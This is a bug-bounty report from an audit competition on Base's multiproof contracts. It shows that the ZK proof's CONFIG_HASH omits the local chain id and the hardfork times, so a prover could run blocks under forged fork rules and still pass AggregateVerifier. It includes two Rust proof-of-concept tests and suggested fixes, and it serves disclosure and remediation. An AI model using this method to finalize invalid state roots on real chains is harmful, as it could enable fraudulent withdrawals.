# 75116 sc medium zk proof config binding bypass allows proofs for base sepolia to execute under a forged rollup config

**Submitted on Apr 27th 2026 at 10:54:13 UTC by @Brainiac5 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75116
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1

## Description

### Brief/Intro

The ZK proof public inputs only commit to `CONFIG_HASH`, but that hash does not bind the local `chain_id` used by `BootInfo::load()` and does not bind the rollup hardfork schedule. A malicious prover can set the local boot `chain_id` to an unsupported value so the proof program loads an attacker-supplied rollup config from the oracle, while that attacker-supplied config still hashes to the official Base Sepolia `CONFIG_HASH`. The proof can then execute the claimed L2 block under different fork rules than Base Sepolia while still satisfying the on-chain `AggregateVerifier` journal.

### Vulnerability Details

`BootInfo::load()` reads a local `L2_CHAIN_ID_KEY` and uses it only to decide whether to load a built-in registry config or fall back to an oracle-provided rollup config:

```rust
let rollup_config = if let Some(config) = Registry::rollup_config(chain_id) {
    config.clone()
} else {
    let ser_cfg = oracle
        .get(PreimageKey::new_local(L2_ROLLUP_CONFIG_KEY.to()))
        .await
        .map_err(OracleProviderError::Preimage)?;
    serde_json::from_slice(&ser_cfg).map_err(OracleProviderError::Serde)?
};
```

There is no check that the local `chain_id` equals `rollup_config.l2_chain_id`.

The ZK public values then commit this:

```rust
rollupConfigHash: hash_rollup_config(&boot_info.rollup_config)
```

But `hash_rollup_config()` uses `PerChainConfig`, whose binary encoding does not include the local boot `chain_id` and does not include hardfork activation times. The code comments explicitly say the hash is stable across hardfork upgrades.

That means the following two configs produce the same public `CONFIG_HASH`:

1. The real Base Sepolia rollup config.
2. A forged oracle-provided rollup config whose `l2_chain_id` and genesis fields still match Base Sepolia, but whose hardfork schedule disables Azul.

At the Azul timestamp, the real config selects `OpSpecId::AZUL`, while the forged config selects `OpSpecId::JOVIAN`. These are different EVM rules. For example, the Osaka `CLZ` opcode is valid under Azul but invalid under Jovian. In a real block, this can be turned into a different output root by using a transaction whose Azul path succeeds and changes contract state, while the forged pre-Azul path fails or takes different logic.

The range program executes with `boot_info.rollup_config`:

```rust
let rollup_config = Arc::new(boot_info.rollup_config.clone());
...
executor
    .run(boot_info, pipeline, cursor, l2_provider, intermediate_root_interval)
    .await
    .unwrap()
```

The aggregation program carries forward only `rollupConfigHash` and commits the digest that the Solidity verifier checks:

```rust
let agg_outputs = AggregationOutputs {
    ...
    rollupConfigHash: final_boot_info.rollupConfigHash,
    imageHash: multi_block_vkey_b256,
};

let packed = agg_outputs.abi_encode_packed();
let digest = keccak256(&packed);
sp1_zkvm::io::commit_slice(digest.as_ref());
```

On-chain, `AggregateVerifier` checks only `CONFIG_HASH` and `ZK_RANGE_HASH` inside the journal:

```solidity
bytes32 journal = keccak256(
    abi.encodePacked(
        proposer,
        l1OriginHash,
        startingRoot,
        startingL2SequenceNumber,
        endingRoot,
        endingL2SequenceNumber,
        intermediateRoots,
        CONFIG_HASH,
        ZK_RANGE_HASH
    )
);

if (!ZK_VERIFIER.verify(proofBytes, ZK_AGGREGATE_HASH, journal)) revert InvalidProof();
```

The Solidity verifier never sees the local boot `chain_id`, and `CONFIG_HASH` cannot distinguish the forged hardfork schedule from the real one.

## Impact Details

This breaks the binding between the on-chain Base Sepolia game and the actual execution rules used inside the ZK proof.

Concrete impact chain:

* The attacker creates or challenges an `AggregateVerifier` game with a ZK proof.
* The proof witness uses an unsupported local boot `chain_id`, causing `BootInfo::load()` to accept oracle-provided rollup config.
* That oracle-provided config keeps Base Sepolia identity fields so the proof commits the official Sepolia `CONFIG_HASH`.
* The config changes hardfork timing, so the proof executor derives/executes L2 blocks under non-canonical rules.
* The aggregation proof still produces a journal matching `AggregateVerifier.CONFIG_HASH`.
* `AggregateVerifier` accepts the ZK proof for a state root that was not produced by canonical Base Sepolia execution.
* With `PROOF_THRESHOLD = 1`, the game can later resolve `DEFENDER_WINS` and the invalid root can become trusted by the L1 fault-proof/withdrawal path.

This does not rely on TEE compromise, guardian inaction, or a trusted admin mistake. The weakness is in the ZK proof public-input binding.

## Suggested Fix

* Reject unsupported local chain ids inside the ZK proof program for all production proof paths.
* Add a consistency check: `boot.chain_id == boot.rollup_config.l2_chain_id.id()`.
* Include all execution-affecting fields in the public config commitment, especially hardfork activation times and L1 chain id/config inputs.
* Alternatively, do not accept oracle-provided rollup configs in production ZK/TEE proof programs.
* Update `AggregateVerifier.CONFIG_HASH` and proof program commitments to use the expanded hash.

## References

* `base/crates/proof/proof/src/boot.rs:231`
* `base/crates/proof/proof/src/boot.rs:243`
* `base/crates/proof/proof/src/boot.rs:251`
* `base/crates/proof/primitives/src/per_chain_config.rs:85`
* `base/crates/proof/primitives/src/per_chain_config.rs:150`
* `base/crates/proof/primitives/src/per_chain_config.rs:188`
* `base/crates/proof/succinct/utils/client/src/boot.rs:24`
* `base/crates/proof/succinct/utils/client/src/boot.rs:48`
* `base/crates/proof/succinct/programs/range/utils/src/lib.rs:47`
* `base/crates/proof/succinct/programs/aggregation/src/main.rs:102`
* `base/crates/proof/succinct/programs/aggregation/src/main.rs:116`
* `contracts/src/multiproof/AggregateVerifier.sol:917`
* `contracts/src/multiproof/AggregateVerifier.sol:926`
* `contracts/src/multiproof/AggregateVerifier.sol:932`

## Proof of Concept

PoC 1 proves the boot-loader fallback accepts an oracle-controlled rollup config when the local chain id is unsupported, even if that loaded config claims Base Sepolia as `rollup_config.l2_chain_id`.

PoC 1 file:

```
base/crates/proof/proof/tests/audit_boot_info_fallback.rs
```

Run:

```sh
cd base-azul/base
cargo test --locked -p base-proof --test audit_boot_info_fallback --config 'target.aarch64-apple-darwin.rustflags=["-C","link-arg=-fuse-ld=ld"]'
```

Observed result:

```
running 1 test
test audit_unknown_local_chain_id_uses_oracle_config_with_base_sepolia_l2_chain_id ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

Full PoC 1 code:

```rust
//! Audit PoC: unsupported local chain ids load oracle-controlled rollup configs.

use std::collections::HashMap;

use alloy_primitives::B256;
use async_trait::async_trait;
use base_common_chains::Registry;
use base_common_genesis::HardforkConfig;
use base_proof::{
    BootInfo, L1_HEAD_KEY, L2_CHAIN_ID_KEY, L2_CLAIM_BLOCK_NUMBER_KEY, L2_CLAIM_KEY,
    L2_OUTPUT_ROOT_KEY, L2_ROLLUP_CONFIG_KEY,
};
use base_proof_preimage::{
    PreimageKey, PreimageOracleClient,
    errors::{PreimageOracleError, PreimageOracleResult},
};

#[derive(Clone)]
struct MockOracle {
    data: HashMap<PreimageKey, Vec<u8>>,
}

#[async_trait]
impl PreimageOracleClient for MockOracle {
    async fn get(&self, key: PreimageKey) -> PreimageOracleResult<Vec<u8>> {
        self.data.get(&key).cloned().ok_or(PreimageOracleError::KeyNotFound)
    }

    async fn get_exact(&self, key: PreimageKey, buf: &mut [u8]) -> PreimageOracleResult<()> {
        let value = self.get(key).await?;
        if value.len() != buf.len() {
            return Err(PreimageOracleError::BufferLengthMismatch(buf.len(), value.len()));
        }
        buf.copy_from_slice(&value);
        Ok(())
    }
}

#[tokio::test]
async fn audit_unknown_local_chain_id_uses_oracle_config_with_base_sepolia_l2_chain_id() {
    let canonical = Registry::rollup_config(84532).expect("Base Sepolia config exists").clone();
    let mut forged = canonical.clone();
    forged.hardforks.base = HardforkConfig { azul: None };

    let mut data = HashMap::new();
    data.insert(
        PreimageKey::new_local(L1_HEAD_KEY.to()),
        B256::repeat_byte(0x11).to_vec(),
    );
    data.insert(
        PreimageKey::new_local(L2_OUTPUT_ROOT_KEY.to()),
        B256::repeat_byte(0x22).to_vec(),
    );
    data.insert(
        PreimageKey::new_local(L2_CLAIM_KEY.to()),
        B256::repeat_byte(0x33).to_vec(),
    );
    data.insert(
        PreimageKey::new_local(L2_CLAIM_BLOCK_NUMBER_KEY.to()),
        40_308_263u64.to_be_bytes().to_vec(),
    );
    data.insert(
        PreimageKey::new_local(L2_CHAIN_ID_KEY.to()),
        999_999_999u64.to_be_bytes().to_vec(),
    );
    data.insert(
        PreimageKey::new_local(L2_ROLLUP_CONFIG_KEY.to()),
        serde_json::to_vec(&forged).expect("rollup config should serialize"),
    );

    let boot = BootInfo::load(&MockOracle { data }).await.expect("boot info should load");

    assert_eq!(boot.chain_id, 999_999_999);
    assert_eq!(
        boot.rollup_config.l2_chain_id.id(),
        84532,
        "the loaded rollup config can still claim Base Sepolia"
    );
    assert_eq!(
        boot.rollup_config.hardforks.base.azul,
        None,
        "the loaded oracle config can use non-canonical fork rules"
    );
}
```

PoC 2 proves the forged config commits the official Base Sepolia `CONFIG_HASH` while executing the same Azul timestamp under different EVM rules.

PoC 2 file:

```
base/crates/proof/succinct/utils/client/tests/audit_rollup_config_binding.rs
```

Run:

```sh
cd /Users/shealtielanz/bounty/base-azul/base
cargo test --locked -p base-proof-succinct-client-utils --test audit_rollup_config_binding --config 'target.aarch64-apple-darwin.rustflags=["-C","link-arg=-fuse-ld=ld"]'
```

Observed result:

```
running 1 test
test audit_unknown_chain_id_can_commit_official_config_hash_with_wrong_fork_rules ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

Full PoC 2 code:

```rust
//! Audit PoC: the public rollup config hash does not bind the local chain id or hardfork schedule.

use alloy_genesis::ChainConfig;
use alloy_primitives::{Address, B256, Bytes, U256, b256, bytes};
use base_common_chains::Registry;
use base_common_evm::{
    BasePrecompiles, BaseTransaction, Builder as _, DefaultBase as _, L1BlockInfo, OpSpecId,
};
use base_common_genesis::HardforkConfig;
use base_proof::BootInfo;
use base_proof_succinct_client_utils::boot::{BootInfoStruct, hash_rollup_config};
use revm::{
    Context, ExecuteEvm,
    bytecode::Bytecode,
    context::{CfgEnv, TxEnv},
    database::InMemoryDB,
    primitives::TxKind,
    state::AccountInfo,
};

fn run_clz_bytecode(spec: OpSpecId) -> Option<U256> {
    let contract = Address::from([0x42; 20]);
    let caller = Address::from([0x11; 20]);

    let mut db = InMemoryDB::default();
    db.insert_account_info(
        contract,
        AccountInfo {
            // PUSH1 0x80, CLZ, PUSH1 0x00, MSTORE, PUSH1 0x20, PUSH1 0x00, RETURN
            code: Some(Bytecode::new_legacy(bytes!("60801E60005260206000F3"))),
            ..Default::default()
        },
    );
    db.insert_account_info(
        caller,
        AccountInfo { balance: U256::from(1_000_000), ..Default::default() },
    );

    let mut evm = Context::base()
        .with_db(db)
        .with_cfg(CfgEnv::new_with_spec(spec))
        .with_chain(L1BlockInfo {
            l2_block: Some(U256::ZERO),
            operator_fee_scalar: Some(U256::ZERO),
            operator_fee_constant: Some(U256::ZERO),
            ..Default::default()
        })
        .build_base()
        .with_precompiles(BasePrecompiles::new_with_spec(spec));

    let tx = BaseTransaction::builder()
        .base(TxEnv::builder().caller(caller).kind(TxKind::Call(contract)).gas_limit(100_000))
        .enveloped_tx(Some(Bytes::from_static(b"AUDIT")))
        .build_fill();

    let result = evm.transact_one(tx).expect("transaction should execute to a result");
    result.is_success().then(|| U256::from_be_slice(result.output().unwrap()))
}

#[test]
fn audit_unknown_chain_id_can_commit_official_config_hash_with_wrong_fork_rules() {
    let canonical = Registry::rollup_config(84532).expect("Base Sepolia config exists").clone();
    let azul_timestamp = canonical.hardforks.base.azul.expect("Base Sepolia has Azul scheduled");

    let mut forged = canonical.clone();
    forged.hardforks.base = HardforkConfig { azul: None };

    assert_eq!(
        hash_rollup_config(&canonical),
        b256!("12e9c45f19f9817c6d4385fad29e7a70c355502cf0883e76a9a7e478a85d1360")
    );
    assert_eq!(
        hash_rollup_config(&canonical),
        hash_rollup_config(&forged),
        "CONFIG_HASH excludes hardfork timing, so disabling Azul does not change the public hash"
    );

    let canonical_spec = OpSpecId::from_timestamp(&canonical, azul_timestamp);
    let forged_spec = OpSpecId::from_timestamp(&forged, azul_timestamp);
    assert_eq!(canonical_spec, OpSpecId::AZUL);
    assert_eq!(
        forged_spec,
        OpSpecId::JOVIAN,
        "the same L2 timestamp is executed under different fork rules"
    );

    assert_eq!(
        run_clz_bytecode(canonical_spec),
        Some(U256::from(248)),
        "CLZ is valid after Azul under the canonical config"
    );
    assert_eq!(
        run_clz_bytecode(forged_spec),
        None,
        "the same bytecode fails before Azul under the forged config"
    );

    let boot = BootInfo {
        l1_head: B256::repeat_byte(0x11),
        agreed_l2_output_root: B256::repeat_byte(0x22),
        claimed_l2_output_root: B256::repeat_byte(0x33),
        claimed_l2_block_number: 40_307_663 + 600,
        // A malicious prover can choose an unknown local chain id to make BootInfo::load()
        // fall back to oracle-provided rollup_config, while the committed RollupConfig still
        // claims to be Base Sepolia through rollup_config.l2_chain_id.
        chain_id: 999_999_999,
        rollup_config: forged,
        l1_config: ChainConfig::default(),
        proposer: Address::from([0x44; 20]),
        intermediate_block_interval: 30,
        l1_head_number: 1,
    };

    let public_values = BootInfoStruct::new(boot, 40_307_663, vec![B256::repeat_byte(0x33)]);
    assert_eq!(
        public_values.rollupConfigHash,
        hash_rollup_config(&canonical),
        "the public values still commit the official Base Sepolia CONFIG_HASH"
    );
}
```

## Expected vs Actual

**Expected:**

The ZK proof should be bound to the exact Base Sepolia rollup config used by canonical execution, including the local chain id and all hardfork activation fields that affect EVM semantics.

**Actual:**

The ZK proof can use an unsupported local boot `chain_id` to load oracle-controlled rollup config, execute using altered hardfork rules, and still commit the official Base Sepolia `CONFIG_HASH` accepted by `AggregateVerifier`.
